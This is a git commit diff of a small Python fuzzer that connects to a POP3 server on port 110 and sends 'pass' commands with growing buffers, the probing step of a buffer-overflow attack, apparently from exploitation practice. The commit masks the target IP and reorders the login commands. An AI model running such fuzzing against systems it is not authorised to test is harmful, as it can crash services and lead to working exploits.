4cbb39f431f2233fee05ce965f37e5ba39495622
Lucas Marchesin <83802271+L0ghunt@users.noreply.github.com>
2024-01-09 12:36:38 -0300

    Update Fuzzer.py

--- Fuzzer.py
+++ Fuzzer.py
@@ -8,14 +8,16 @@ while len(buffer) <= 30:
     counter += 200
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(('192.168.6.23', 110))
+s.connect(('192.168.x.x', 110))
 s.recv(1024)
-s.send('user itsafe\r\n'.encode('utf-8'))  # Enviando 'user' em letras minúsculas
-s.recv(1024)
+
+
 
 for string in buffer:
     print("Fuzzing the pass with {} bytes".format(len(string)))
-    s.send(('pass ' + str(string) + '\r\n').encode('utf-8'))
+    s.send('user itsafe\r\n'.encode('utf-8'))  # Enviando 'user' em letras minúsculas
+    s.recv(1024)
+    s.send(b'pass ' + str(string).encode('utf-8') + b'\r\n')
     s.recv(1024)
 
 s.send(b"quit/r/n")  # Enviando 'quit' em letras minúsculas
